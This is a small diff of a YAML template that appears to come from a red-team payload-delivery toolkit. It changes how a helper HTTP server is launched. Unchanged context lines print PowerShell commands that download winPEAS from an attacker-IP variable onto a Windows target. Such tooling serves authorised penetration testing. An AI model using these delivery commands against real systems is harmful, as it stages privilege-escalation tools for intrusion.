@@ -18,4 +18,4 @@ content: |
   echo 'Deliver only (x64): powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/winPEASx64.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe'; \
   echo 'Deliver only (x86): powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/winPEASx86.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe'; \
   echo '================================================================'; \
-  python -m <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
